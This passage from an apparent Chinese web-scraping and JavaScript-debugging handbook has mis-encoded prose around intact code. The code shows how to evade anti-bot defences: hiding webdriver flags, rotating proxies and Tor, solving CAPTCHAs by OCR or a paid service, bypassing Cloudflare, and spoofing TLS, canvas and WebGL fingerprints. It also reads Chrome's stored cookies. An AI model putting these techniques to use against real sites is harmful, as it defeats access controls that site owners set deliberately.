<pre><code class="language-python">response = requests.get(url)

# æŸ¥çœ‹é‡å®šå‘é“¾
for r in response.history:
    print(f&quot;{r.status_code} -&gt; {r.url}&quot;)

print(f&quot;Final: {response.status_code} -&gt; {response.url}&quot;)
</code></pre>
<hr />
<h2>Headers é…ç½®é—®é¢˜</h2>
<h3>é—®é¢˜è¡¨ç°</h3>
<ul>
<li>è¯·æ±‚è¢«æ‹’ç»</li>
<li>è¿”å›å¼‚å¸¸æ•°æ®</li>
</ul>
<h3>è§£å†³æ–¹æ¡ˆ</h3>
<h4>1. å®Œæ•´çš„ Headers</h4>
<pre><code class="language-python">headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive',
    'Referer': 'https://example.com/',
    'Origin': 'https://example.com',
}

response = requests.get(url, headers=headers)
</code></pre>
<h4>2. ä»æµè§ˆå™¨å¤åˆ¶ Headers</h4>
<pre><code class="language-javascript">// æµè§ˆå™¨æ§åˆ¶å°æ‰§è¡Œ
copy(
  JSON.stringify(
    Object.fromEntries(
      [
        ...document.querySelector(&quot;.request-headers&quot;).querySelectorAll(&quot;tr&quot;),
      ].map((r) =&gt; [r.cells[0].textContent, r.cells[1].textContent])
    ),
    null,
    2
  )
);
</code></pre>
<h4>3. è°ƒè¯• Headers</h4>
<pre><code class="language-python"># æŸ¥çœ‹è¯·æ±‚å¤´
response = requests.get('http://httpbin.org/headers', headers=headers)
print(response.json())

# æŸ¥çœ‹å“åº”å¤´
print(response.headers)
</code></pre>
<hr />
<h2>ğŸ“š ç›¸å…³ç« èŠ‚</h2>
<ul>
<li><a href="#section-5">HTTP/HTTPS åè®®</a></li>
<li><a href="#section-67">HTTP Headers é€ŸæŸ¥</a></li>
<li><a href="#section-26">è°ƒè¯•æŠ€å·§</a></li>
</ul>

                                            </div>
                                            
                                            <div class="section" id="section-76">
                                                <h2>[R75] Anti-Scraping Issues</h2>
                                                <h1>R75: åçˆ¬è™«é—®é¢˜</h1>
<p>åº”å¯¹å„ç§åçˆ¬è™«æœºåˆ¶çš„å¸¸è§é—®é¢˜å’Œè§£å†³æ–¹æ¡ˆã€‚</p>
<hr />
<h2>403 Forbidden</h2>
<h3>é—®é¢˜è¡¨ç°</h3>
<pre><code>HTTP 403 Forbidden
Access Denied
</code></pre>
<h3>åŸå› åˆ†æ</h3>
<ol>
<li>User-Agent è¢«æ£€æµ‹</li>
<li>Referer éªŒè¯å¤±è´¥</li>
<li>IP è¢«å°ç¦</li>
<li>ç¼ºå°‘å¿…è¦çš„ Headers</li>
<li>JavaScript æŒ‘æˆ˜æœªé€šè¿‡</li>
</ol>
<h3>è§£å†³æ–¹æ¡ˆ</h3>
<h4>1. å®Œå–„ Headers</h4>
<pre><code class="language-python">import requests

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-User': '?1',
    'Cache-Control': 'max-age=0',
}

# å¦‚æœæ˜¯ä»å…¶ä»–é¡µé¢è·³è½¬è¿‡æ¥çš„ï¼Œæ·»åŠ  Referer
headers['Referer'] = 'https://example.com/previous-page'

response = requests.get(url, headers=headers)
</code></pre>
<h4>2. ä½¿ç”¨çœŸå®æµè§ˆå™¨ç¯å¢ƒ</h4>
<pre><code class="language-python">from selenium import webdriver
from selenium.webdriver.chrome.options import Options

options = Options()
options.add_argument('--disable-blink-features=AutomationControlled')
options.add_experimental_option('excludeSwitches', ['enable-automation'])
options.add_experimental_option('useAutomationExtension', False)

driver = webdriver.Chrome(options=options)

# ä¿®æ”¹ webdriver å±æ€§
driver.execute_cdp_cmd('Page.addScriptToEvaluateOnNewDocument', {
    'source': '''
        Object.defineProperty(navigator, 'webdriver', {
            get: () =&gt; undefined
        })
    '''
})

driver.get(url)
</code></pre>
<h4>3. ä½¿ç”¨æ— å¤´æµè§ˆå™¨</h4>
<pre><code class="language-python">from playwright.sync_api import sync_playwright

with sync_playwright() as p:
    browser = p.chromium.launch(headless=True)
    page = browser.new_page()

    # è®¾ç½®é¢å¤–çš„ headers
    page.set_extra_http_headers({
        'Accept-Language': 'zh-CN,zh;q=0.9',
    })

    page.goto(url)
    content = page.content()
    browser.close()
</code></pre>
<hr />
<h2>429 Too Many Requests</h2>
<h3>é—®é¢˜è¡¨ç°</h3>
<pre><code>HTTP 429 Too Many Requests
Rate limit exceeded
</code></pre>
<h3>åŸå› åˆ†æ</h3>
<ol>
<li>è¯·æ±‚é¢‘ç‡è¿‡é«˜</li>
<li>åŒä¸€ IP è¯·æ±‚è¿‡å¤š</li>
<li>è¶…è¿‡ API é™é¢</li>
</ol>
<h3>è§£å†³æ–¹æ¡ˆ</h3>
<h4>1. æ·»åŠ è¯·æ±‚å»¶è¿Ÿ</h4>
<pre><code class="language-python">import time
import random

def fetch_with_delay(url):
    # éšæœºå»¶è¿Ÿ 1-3 ç§’
    delay = random.uniform(1, 3)
    time.sleep(delay)

    response = requests.get(url)
    return response

# æ‰¹é‡è¯·æ±‚
for url in urls:
    response = fetch_with_delay(url)
    # å¤„ç†å“åº”...
</code></pre>
<h4>2. å®ç°é€€é¿ç®—æ³•</h4>
<pre><code class="language-python">import time

def fetch_with_backoff(url, max_retries=5):
    &quot;&quot;&quot;æŒ‡æ•°é€€é¿é‡è¯•&quot;&quot;&quot;
    for attempt in range(max_retries):
        try:
            response = requests.get(url)

            if response.status_code == 429:
                # è·å– Retry-After å¤´
                retry_after = int(response.headers.get('Retry-After', 60))
                wait_time = min(retry_after, 2 ** attempt)

                print(f&quot;Rate limited. Waiting {wait_time}s...&quot;)
                time.sleep(wait_time)
                continue

            return response

        except Exception as e:
            print(f&quot;Attempt {attempt + 1} failed: {e}&quot;)
            time.sleep(2 ** attempt)

    raise Exception(&quot;Max retries exceeded&quot;)
</code></pre>
<h4>3. ä½¿ç”¨ä»£ç†æ± è½®æ¢</h4>
<pre><code class="language-python">import random

class ProxyPool:
    def __init__(self, proxies):
        self.proxies = proxies
        self.failed_proxies = set()

    def get_proxy(self):
        &quot;&quot;&quot;è·å–å¯ç”¨ä»£ç†&quot;&quot;&quot;
        available = [p for p in self.proxies if p not in self.failed_proxies]
        if not available:
            # é‡ç½®å¤±è´¥åˆ—è¡¨
            self.failed_proxies.clear()
            available = self.proxies

        return random.choice(available)

    def mark_failed(self, proxy):
        &quot;&quot;&quot;æ ‡è®°ä»£ç†å¤±è´¥&quot;&quot;&quot;
        self.failed_proxies.add(proxy)

# ä½¿ç”¨ç¤ºä¾‹
proxy_list = [
    'http://proxy1.com:8080',
    'http://proxy2.com:8080',
    'http://proxy3.com:8080',
]

pool = ProxyPool(proxy_list)

def fetch_with_proxy_rotation(url):
    for _ in range(3):
        proxy = pool.get_proxy()
        try:
            response = requests.get(
                url,
                proxies={'http': proxy, 'https': proxy},
                timeout=10
            )
            return response
        except Exception as e:
            print(f&quot;Proxy {proxy} failed: {e}&quot;)
            pool.mark_failed(proxy)

    raise Exception(&quot;All proxies failed&quot;)
</code></pre>
<hr />
<h2>IP è¢«å°ç¦</h2>
<h3>é—®é¢˜è¡¨ç°</h3>
<ul>
<li>æ‰€æœ‰è¯·æ±‚è¿”å› 403</li>
<li>é•¿æ—¶é—´æ— å“åº”</li>
<li>é‡å®šå‘åˆ°éªŒè¯é¡µé¢</li>
</ul>
<h3>è§£å†³æ–¹æ¡ˆ</h3>
<h4>1. ä½¿ç”¨ä»£ç†æœåŠ¡</h4>
<pre><code class="language-python"># ä½¿ç”¨å•†ä¸šä»£ç†æœåŠ¡
PROXY_API_URL = &quot;http://proxy-service.com/api/get&quot;

def get_proxy():
    &quot;&quot;&quot;ä»ä»£ç†æœåŠ¡è·å–ä»£ç†&quot;&quot;&quot;
    response = requests.get(PROXY_API_URL)
    proxy = response.text.strip()
    return f&quot;http://{proxy}&quot;

def fetch_with_dynamic_proxy(url):
    proxy = get_proxy()
    proxies = {'http': proxy, 'https': proxy}

    response = requests.get(url, proxies=proxies)
    return response
</code></pre>
<h4>2. ä½¿ç”¨ Tor ç½‘ç»œ</h4>
<pre><code class="language-python">import requests

# Tor SOCKS5 ä»£ç† (éœ€è¦è¿è¡Œ Tor æœåŠ¡)
proxies = {
    'http': 'socks5h://127.0.0.1:9050',
    'https': 'socks5h://127.0.0.1:9050',
}

# å®‰è£…: pip install requests[socks]
response = requests.get(url, proxies=proxies)

# éªŒè¯ IP
ip_check = requests.get('http://httpbin.org/ip', proxies=proxies)
print(f&quot;Current IP: {ip_check.json()}&quot;)
</code></pre>
<h4>3. è½®æ¢ç”¨æˆ·èº«ä»½</h4>
<pre><code class="language-python">import random

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) ...',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) ...',
    'Mozilla/5.0 (X11; Linux x86_64) ...',
]

def get_random_headers():
    return {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept-Language': random.choice(['zh-CN,zh;q=0.9', 'en-US,en;q=0.9']),
    }

response = requests.get(url, headers=get_random_headers())
</code></pre>
<hr />
<h2>éªŒè¯ç æ‹¦æˆª</h2>
<h3>é—®é¢˜è¡¨ç°</h3>
<ul>
<li>ç™»å½•æˆ–è®¿é—®æ—¶å‡ºç°éªŒè¯ç </li>
<li>å›¾ç‰‡éªŒè¯ç ã€æ»‘å—éªŒè¯ç ã€ç‚¹é€‰éªŒè¯ç </li>
</ul>
<h3>è§£å†³æ–¹æ¡ˆ</h3>
<h4>1. å›¾ç‰‡éªŒè¯ç è¯†åˆ« (OCR)</h4>
<pre><code class="language-python">from PIL import Image
import pytesseract
import requests
from io import BytesIO

def recognize_captcha(captcha_url):
    &quot;&quot;&quot;OCR è¯†åˆ«éªŒè¯ç &quot;&quot;&quot;
    # ä¸‹è½½éªŒè¯ç 
    response = requests.get(captcha_url)
    img = Image.open(BytesIO(response.content))

    # å›¾ç‰‡é¢„å¤„ç†
    img = img.convert('L')  # è½¬ç°åº¦
    img = img.point(lambda x: 0 if x &lt; 128 else 255)  # äºŒå€¼åŒ–

    # OCR è¯†åˆ«
    code = pytesseract.image_to_string(img, config='--psm 7')
    return code.strip()

# ä½¿ç”¨ç¤ºä¾‹
captcha_code = recognize_captcha('https://example.com/captcha.jpg')
print(f&quot;Recognized: {captcha_code}&quot;)
</code></pre>
<h4>2. ä½¿ç”¨æ‰“ç å¹³å°</h4>
<pre><code class="language-python">import requests
import time

class TwoCaptcha:
    &quot;&quot;&quot;2Captcha æ‰“ç å¹³å°&quot;&quot;&quot;

    def __init__(self, api_key):
        self.api_key = api_key
        self.base_url = &quot;http://2captcha.com&quot;

    def solve_image_captcha(self, image_path):
        &quot;&quot;&quot;è§£å†³å›¾ç‰‡éªŒè¯ç &quot;&quot;&quot;
        # 1. æäº¤éªŒè¯ç 
        with open(image_path, 'rb') as f:
            files = {'file': f}
            data = {'key': self.api_key, 'method': 'post'}
            response = requests.post(
                f&quot;{self.base_url}/in.php&quot;,
                files=files,
                data=data
            )

        if not response.text.startswith('OK|'):
            raise Exception(f&quot;Submit failed: {response.text}&quot;)

        captcha_id = response.text.split('|')[1]

        # 2. è½®è¯¢ç»“æœ
        for _ in range(20):
            time.sleep(5)
            result = requests.get(
                f&quot;{self.base_url}/res.php&quot;,
                params={
                    'key': self.api_key,
                    'action': 'get',
                    'id': captcha_id
                }
            )

            if result.text.startswith('OK|'):
                return result.text.split('|')[1]

        raise Exception(&quot;Timeout waiting for result&quot;)

# ä½¿ç”¨ç¤ºä¾‹
solver = TwoCaptcha(api_key='your_api_key')
code = solver.solve_image_captcha('captcha.jpg')
</code></pre>
<h4>3. æ»‘å—éªŒè¯ç </h4>
<pre><code class="language-python">from selenium import webdriver
from selenium.webdriver.common.action_chains import ActionChains
import time

def solve_slider_captcha(driver):
    &quot;&quot;&quot;è§£å†³æ»‘å—éªŒè¯ç &quot;&quot;&quot;
    # æ‰¾åˆ°æ»‘å—å…ƒç´ 
    slider = driver.find_element('css selector', '.slider-button')

    # æ¨¡æ‹Ÿäººç±»æ»‘åŠ¨è½¨è¿¹
    def get_track(distance):
        &quot;&quot;&quot;ç”Ÿæˆç§»åŠ¨è½¨è¿¹&quot;&quot;&quot;
        track = []
        current = 0
        mid = distance * 4 / 5

        # åŠ é€Ÿé˜¶æ®µ
        while current &lt; mid:
            move = 2
            track.append(move)
            current += move

        # å‡é€Ÿé˜¶æ®µ
        while current &lt; distance:
            move = 1
            track.append(move)
            current += move

        return track

    # è·å–éœ€è¦æ»‘åŠ¨çš„è·ç¦»
    distance = 260  # æ ¹æ®å®é™…æƒ…å†µè°ƒæ•´

    # æ‰§è¡Œæ»‘åŠ¨
    action = ActionChains(driver)
    action.click_and_hold(slider).perform()

    for move in get_track(distance):
        action.move_by_offset(move, 0).perform()
        time.sleep(0.01)

    action.release().perform()
    time.sleep(1)
</code></pre>
<hr />
<h2>JavaScript æŒ‘æˆ˜</h2>
<h3>é—®é¢˜è¡¨ç°</h3>
<ul>
<li>é¡µé¢æ˜¾ç¤º &quot;Checking your browser&quot;</li>
<li>Cloudflareã€DataDome ç­‰é˜²æŠ¤</li>
<li>éœ€è¦æ‰§è¡Œ JavaScript æ‰èƒ½è®¿é—®</li>
</ul>
<h3>è§£å†³æ–¹æ¡ˆ</h3>
<h4>1. ä½¿ç”¨ cloudscraper</h4>
<pre><code class="language-python">import cloudscraper

# è‡ªåŠ¨ç»•è¿‡ Cloudflare
scraper = cloudscraper.create_scraper()
response = scraper.get(url)
print(response.text)
</code></pre>
<h4>2. ä½¿ç”¨ Selenium + undetected-chromedriver</h4>
<pre><code class="language-python">import undetected_chromedriver as uc

driver = uc.Chrome()
driver.get(url)

# ç­‰å¾…é¡µé¢åŠ è½½
time.sleep(5)

# è·å–å†…å®¹
html = driver.page_source
driver.quit()
</code></pre>
<h4>3. ä½¿ç”¨ Playwright (Stealth)</h4>
<pre><code class="language-python">from playwright.sync_api import sync_playwright

with sync_playwright() as p:
    browser = p.chromium.launch(
        headless=True,
        args=['--disable-blink-features=AutomationControlled']
    )

    context = browser.new_context(
        viewport={'width': 1920, 'height': 1080},
        user_agent='Mozilla/5.0 ...'
    )

    page = context.new_page()

    # æ·»åŠ  stealth è„šæœ¬
    page.add_init_script(&quot;&quot;&quot;
        Object.defineProperty(navigator, 'webdriver', {
            get: () =&gt; undefined
        });
        Object.defineProperty(navigator, 'plugins', {
            get: () =&gt; [1, 2, 3, 4, 5]
        });
    &quot;&quot;&quot;)

    page.goto(url)
    page.wait_for_load_state('networkidle')

    content = page.content()
    browser.close()
</code></pre>
<hr />
<h2>Cookie/Session è·Ÿè¸ª</h2>
<h3>é—®é¢˜è¡¨ç°</h3>
<ul>
<li>éœ€è¦ä¿æŒç™»å½•çŠ¶æ€</li>
<li>è·¨é¡µé¢è¯·æ±‚å¤±è´¥</li>
<li>Session è¿‡æœŸ</li>
</ul>
<h3>è§£å†³æ–¹æ¡ˆ</h3>
<h4>1. ä½¿ç”¨ Session å¯¹è±¡</h4>
<pre><code class="language-python">import requests

session = requests.Session()

# ç™»å½•
login_data = {
    'username': 'user',
    'password': 'pass'
}
session.post('https://example.com/login', data=login_data)

# åç»­è¯·æ±‚è‡ªåŠ¨æºå¸¦ Cookie
response = session.get('https://example.com/protected-page')

# ä¿å­˜ Session
import pickle
with open('session.pkl', 'wb') as f:
    pickle.dump(session.cookies, f)

# åŠ è½½ Session
with open('session.pkl', 'rb') as f:
    session.cookies.update(pickle.load(f))
</code></pre>
<h4>2. æµè§ˆå™¨ Cookie å¯¼å…¥</h4>
<pre><code class="language-python">import browser_cookie3

# ä» Chrome è·å– Cookie
cookies = browser_cookie3.chrome(domain_name='example.com')

session = requests.Session()
session.cookies = cookies

response = session.get('https://example.com')
</code></pre>
<hr />
<h2>TLS æŒ‡çº¹è¯†åˆ«</h2>
<h3>é—®é¢˜è¡¨ç°</h3>
<ul>
<li>å³ä½¿ Headers å®Œå…¨ç›¸åŒä»è¢«æ£€æµ‹</li>
<li>åŸºäº JA3 æŒ‡çº¹è¯†åˆ«</li>
</ul>
<h3>è§£å†³æ–¹æ¡ˆ</h3>
<h4>1. ä½¿ç”¨ curl_cffi</h4>
<pre><code class="language-python">from curl_cffi import requests

# æ¨¡æ‹Ÿ Chrome çš„ TLS æŒ‡çº¹
response = requests.get(
    url,
    impersonate=&quot;chrome110&quot;
)
print(response.text)
</code></pre>
<h4>2. ä½¿ç”¨çœŸå®æµè§ˆå™¨</h4>
<pre><code class="language-python"># Playwright å’Œ Selenium ä½¿ç”¨çœŸå®æµè§ˆå™¨,
# è‡ªç„¶å…·æœ‰çœŸå®çš„ TLS æŒ‡çº¹

from playwright.sync_api import sync_playwright

with sync_playwright() as p:
    browser = p.chromium.launch()
    page = browser.new_page()
    page.goto(url)
    content = page.content()
    browser.close()
</code></pre>
<hr />
<h2>WebSocket åçˆ¬</h2>
<h3>é—®é¢˜è¡¨ç°</h3>
<ul>
<li>å®æ—¶æ•°æ®é€šè¿‡ WebSocket ä¼ è¾“</li>
<li>éœ€è¦ç»´æŒé•¿è¿æ¥</li>
</ul>
<h3>è§£å†³æ–¹æ¡ˆ</h3>
<pre><code class="language-python">import websocket
import json

def on_message(ws, message):
    &quot;&quot;&quot;æ¥æ”¶æ¶ˆæ¯å›è°ƒ&quot;&quot;&quot;
    data = json.loads(message)
    print(f&quot;Received: {data}&quot;)

def on_error(ws, error):
    print(f&quot;Error: {error}&quot;)

def on_close(ws, close_status_code, close_msg):
    print(&quot;Connection closed&quot;)

def on_open(ws):
    &quot;&quot;&quot;è¿æ¥å»ºç«‹åå‘é€è®¢é˜…æ¶ˆæ¯&quot;&quot;&quot;
    subscribe_msg = json.dumps({
        &quot;action&quot;: &quot;subscribe&quot;,
        &quot;channel&quot;: &quot;data_feed&quot;
    })
    ws.send(subscribe_msg)

# åˆ›å»º WebSocket è¿æ¥
ws = websocket.WebSocketApp(
    &quot;wss://example.com/ws&quot;,
    on_open=on_open,
    on_message=on_message,
    on_error=on_error,
    on_close=on_close,
    header={
        &quot;User-Agent&quot;: &quot;Mozilla/5.0 ...&quot;,
        &quot;Origin&quot;: &quot;https://example.com&quot;
    }
)

ws.run_forever()
</code></pre>
<hr />
<h2>è®¾å¤‡æŒ‡çº¹è¯†åˆ«</h2>
<h3>é—®é¢˜è¡¨ç°</h3>
<ul>
<li>Canvas æŒ‡çº¹</li>
<li>WebGL æŒ‡çº¹</li>
<li>æµè§ˆå™¨ç‰¹å¾è¯†åˆ«</li>
</ul>
<h3>è§£å†³æ–¹æ¡ˆ</h3>
<h4>1. ä½¿ç”¨æŒ‡çº¹æ¬ºéª—</h4>
<pre><code class="language-python">from playwright.sync_api import sync_playwright

with sync_playwright() as p:
    browser = p.chromium.launch()
    context = browser.new_context()

    # æ³¨å…¥åæŒ‡çº¹è„šæœ¬
    context.add_init_script(&quot;&quot;&quot;
        // æ¬ºéª— Canvas æŒ‡çº¹
        const originalToDataURL = HTMLCanvasElement.prototype.toDataURL;
        HTMLCanvasElement.prototype.toDataURL = function() {
            const context = this.getContext('2d');
            const imageData = context.getImageData(0, 0, this.width, this.height);
            // æ·»åŠ å™ªç‚¹
            for (let i = 0; i &lt; imageData.data.length; i += 4) {
                imageData.data[i] += Math.random() * 10 - 5;
            }
            context.putImageData(imageData, 0, 0);
            return originalToDataURL.apply(this, arguments);
        };

        // æ¬ºéª— WebGL æŒ‡çº¹
        const getParameter = WebGLRenderingContext.prototype.getParameter;
        WebGLRenderingContext.prototype.getParameter = function(parameter) {
            if (parameter === 37445) {
                return 'Intel Inc.';
            }
            if (parameter === 37446) {
                return 'Intel Iris OpenGL Engine';
            }
            return getParameter.apply(this, arguments);
        };
    &quot;&quot;&quot;)

    page = context.new_page()
    page.goto(url)
    browser.close()
</code></pre>
<hr />
<h2>ğŸ“š ç›¸å…³ç« èŠ‚</h2>
<ul>
<li><a href="#section-34">æµè§ˆå™¨æŒ‡çº¹</a></li>
<li><a href="#section-33">CAPTCHA ç»•è¿‡</a></li>
<li><a href="#section-37">åçˆ¬è™«æ·±åº¦å‰–æ</a></li>
<li><a href="#section-42">TLS æŒ‡çº¹</a></li>
</ul>

                                            </div>
                                            
                                            <div class="section" id="section-77">
                                                <h2>[R76] JavaScript Debugging</h2>
                                                <h1>R76: JavaScript è°ƒè¯•é—®é¢˜</h1>
<p>JavaScript é€†å‘å’Œè°ƒè¯•ä¸­çš„å¸¸è§é—®é¢˜åŠè§£å†³æ–¹æ¡ˆã€‚</p>
<hr />
<h2>æ–­ç‚¹ä¸ç”Ÿæ•ˆ</h2>
<h3>é—®é¢˜è¡¨ç°</h3>
<ul>
<li>è®¾ç½®æ–­ç‚¹åä»£ç ä¸æš‚åœ</li>
<li>æ–­ç‚¹æ˜¾ç¤ºç°è‰²</li>
<li>ä»£ç è·³è¿‡æ–­ç‚¹ç»§ç»­æ‰§è¡Œ</li>
</ul>
<h3>åŸå› åˆ†æ</h3>
<ol>
<li>ä»£ç å·²è¢«ä¼˜åŒ–æˆ–å†…è”</li>
<li>Source Map ä¸åŒ¹é…</li>
<li>å¼‚æ­¥ä»£ç æ‰§è¡Œæ—¶æœºé—®é¢˜</li>
<li>ä»£ç è¢«åŠ¨æ€ç”Ÿæˆ</li>
</ol>
<h3>è§£å†³æ–¹æ¡ˆ</h3>
<h4>1. ä½¿ç”¨ debugger è¯­å¥</h4>
<pre><code class="language-javascript">// åœ¨ä»£ç ä¸­ç›´æ¥æ’å…¥
function suspiciousFunction(data) {
  debugger; // å¼ºåˆ¶æš‚åœ
  // ... åç»­ä»£ç 
}
</code></pre>
<p><strong>é€šè¿‡ Hook æ³¨å…¥</strong>:</p>
<pre><code class="language-javascript">// åœ¨æ§åˆ¶å°æ‰§è¡Œ
const original = window.someFunction;
window.someFunction = function (...args) {
  debugger; // åœ¨è°ƒç”¨å‰æš‚åœ
  return original.apply(this, args);
};
</code></pre>
<h4>2. ä½¿ç”¨æ¡ä»¶æ–­ç‚¹</h4>
<p>åœ¨ DevTools ä¸­å³é”®æ–­ç‚¹ â†’ Edit breakpoint:</p>
<pre><code class="language-javascript">// åªæœ‰å½“æ¡ä»¶æ»¡è¶³æ—¶æ‰æš‚åœ
userId === 12345;

// æˆ–ä½¿ç”¨è¡¨è¾¾å¼
console.log(&quot;Value:&quot;, someVar) || false;
</code></pre>
<h4>3. DOM æ–­ç‚¹</h4>
<pre><code class="language-javascript">// ç›‘å¬ DOM ä¿®æ”¹
const element = document.querySelector(&quot;#target&quot;);

// Break on: subtree modifications, attribute modifications, node removal
</code></pre>
<h4>4. Event Listener æ–­ç‚¹</h4>
<pre><code class="language-javascript">// DevTools â†’ Sources â†’ Event Listener Breakpoints
// å‹¾é€‰ç›¸å…³äº‹ä»¶ (å¦‚ click, xhr, timeout)

// æˆ–è€…ä»£ç ä¸­ç›‘å¬
monitorEvents(document.body, &quot;click&quot;);
</code></pre>
<hr />
<h2>æ— æ³•æŸ¥çœ‹å˜é‡å€¼</h2>
<h3>é—®é¢˜è¡¨ç°</h3>
<ul>
<li>å˜é‡æ˜¾ç¤º <code>undefined</code> æˆ– <code>&lt;unavailable&gt;</code></li>
<li>Scope ä¸­çœ‹ä¸åˆ°å˜é‡</li>
<li>é—­åŒ…å˜é‡æ— æ³•è®¿é—®</li>
</ul>
<h3>è§£å†³æ–¹æ¡ˆ</h3>
<h4>1. æ£€æŸ¥ä½œç”¨åŸŸ</h4>
<pre><code class="language-javascript">// åœ¨ Console ä¸­ï¼Œä½¿ç”¨æ­£ç¡®çš„ä½œç”¨åŸŸ
// å¦‚æœåœ¨å‡½æ•°å†…éƒ¨æ–­ç‚¹:

// âŒ é”™è¯¯ - å…¨å±€ä½œç”¨åŸŸ
console.log(localVar); // undefined

// âœ… æ­£ç¡® - å½“å‰ä½œç”¨åŸŸå¯è§
// ç›´æ¥åœ¨ Scope é¢æ¿æŸ¥çœ‹ï¼Œæˆ–åœ¨ Console è¾“å…¥å˜é‡å
</code></pre>
<h4>2. ä½¿ç”¨ Watch è¡¨è¾¾å¼</h4>
<pre><code class="language-javascript">// Sources â†’ Watch â†’ Add expression

// æ·»åŠ å¤æ‚è¡¨è¾¾å¼
this.userData.profile.name;
JSON.stringify(config, null, 2);
Object.keys(this);
</code></pre>
<h4>3. ä½¿ç”¨ console.dir æŸ¥çœ‹å¯¹è±¡</h4>
<pre><code class="language-javascript">// æŸ¥çœ‹å¯¹è±¡å®Œæ•´ç»“æ„
console.dir(complexObject);

// æŸ¥çœ‹åŸå‹é“¾
console.log(Object.getPrototypeOf(obj));

// æŸ¥çœ‹æ‰€æœ‰å±æ€§
console.log(Object.getOwnPropertyNames(obj));
</code></pre>
<h4>4. ä¸´æ—¶ä¿®æ”¹ä»£ç </h4>
<pre><code class="language-javascript">// ä½¿ç”¨ Overrides åŠŸèƒ½
// DevTools â†’ Sources â†’ Overrides â†’ Enable Local Overrides

// åœ¨ä»£ç ä¸­æ·»åŠ æ—¥å¿—
function encrypt(data) {
  console.log(&quot;encrypt input:&quot;, data); // æ·»åŠ è¿™è¡Œ
  const result = doEncrypt(data);
  console.log(&quot;encrypt output:&quot;, result); // æ·»åŠ è¿™è¡Œ
  return result;
}
</code></pre>
<hr />
<h2>Source Map é—®é¢˜</h2>
<h3>é—®é¢˜è¡¨ç°</h3>
<ul>
<li>ä»£ç æ˜¾ç¤ºæ··æ·†åçš„ç‰ˆæœ¬</li>
<li>æ— æ³•çœ‹åˆ°åŸå§‹ä»£ç </li>
<li>Source Map åŠ è½½å¤±è´¥</li>
</ul>
<h3>è§£å†³æ–¹æ¡ˆ</h3>
<h4>1. æ‰‹åŠ¨åŠ è½½ Source Map</h4>
<pre><code class="language-javascript">// å¦‚æœæœ‰ .map æ–‡ä»¶
//# sourceMappingURL=app.js.map

// åœ¨ DevTools â†’ Sources å³é”®æ–‡ä»¶ â†’ &quot;Add source map&quot;
// è¾“å…¥ Source Map URL
</code></pre>
<h4>2. ä½¿ç”¨åœ¨çº¿å·¥å…·</h4>
<pre><code class="language-bash"># ä½¿ç”¨ source-map-cli è¿˜åŸ
npm install -g source-map-cli

# æŸ¥çœ‹åŸå§‹ä½ç½®
source-map resolve app.js.map 1 100
</code></pre>
<h4>3. æ ¼å¼åŒ–ä»£ç </h4>
<pre><code class="language-javascript">// DevTools â†’ Sources â†’ ç‚¹å‡» {} æŒ‰é’® (Pretty print)
// æˆ–å¿«æ·é”®: Ctrl + Shift + P â†’ &quot;Pretty print&quot;
</code></pre>
<hr />
<h2>æ··æ·†ä»£ç è°ƒè¯•</h2>
<h3>é—®é¢˜è¡¨ç°</h3>
<ul>
<li>å˜é‡åå¦‚ <code>_0x1a2b</code>, <code>a</code>, <code>b</code></li>
<li>ä»£ç é€»è¾‘éš¾ä»¥ç†è§£</li>
<li>å¤§é‡æ— æ„ä¹‰ä»£ç </li>
</ul>
<h3>è§£å†³æ–¹æ¡ˆ</h3>
<h4>1. ä½¿ç”¨ AST å·¥å…·è¿˜åŸ</h4>
<pre><code class="language-javascript">// ä½¿ç”¨ Babel è¿˜åŸ
const parser = require(&quot;@babel/parser&quot;);
const traverse = require(&quot;@babel/traverse&quot;).default;
const generate = require(&quot;@babel/generator&quot;).default;

const code = `/* æ··æ·†åçš„ä»£ç  */`;
const ast = parser.parse(code);

// è¿˜åŸå˜é‡å
traverse(ast, {
  Identifier(path) {
    if (path.node.name.startsWith(&quot;_0x&quot;)) {
      path.node.name = &quot;var_&quot; + Math.random().toString(36).substr(2, 9);
    }
  },
});

const output = generate(ast, {}, code);
console.log(output.code);
</code></pre>
<h4>2. åœ¨çº¿åæ··æ·†å·¥å…·</h4>
<ul>
<li><a href="https://deobfuscate.io/">https://deobfuscate.io/</a></li>
<li><a href="https://lelinhtinh.github.io/de4js/">https://lelinhtinh.github.io/de4js/</a></li>
</ul>
<h4>3. åŠ¨æ€è°ƒè¯•è¿½è¸ª</h4>
<pre><code class="language-javascript">// Hook æ‰€æœ‰å‡½æ•°è°ƒç”¨
const originalFunction = window._0x1a2b;
window._0x1a2b = function (...args) {
  console.log(&quot;Called with:&quot;, args);
  const result = originalFunction.apply(this, args);
  console.log(&quot;Returned:&quot;, result);
  return result;
};
</code></pre>
<h4>4. ä½¿ç”¨åæ··æ·†è„šæœ¬</h4>
<pre><code class="language-javascript">// Tampermonkey è„šæœ¬
// åœ¨é¡µé¢åŠ è½½å‰æ³¨å…¥
(function () {
  &quot;use strict&quot;;

  // Hook eval
  const originalEval = window.eval;
  window.eval = function (code) {
    console.log(&quot;eval code:&quot;, code);
    return originalEval.call(this, code);
  };

  // Hook Function æ„é€ å™¨
  const OriginalFunction = window.Function;
  window.Function = function (...args) {
    console.log(&quot;Function args:&quot;, args);
    return OriginalFunction.apply(this, args);
  };
})();
</code></pre>
<hr />
<h2>å¼‚æ­¥ä»£ç è·Ÿè¸ª</h2>
<h3>é—®é¢˜è¡¨ç°</h3>
<ul>
<li>Promise/async ä»£ç éš¾ä»¥è°ƒè¯•</li>
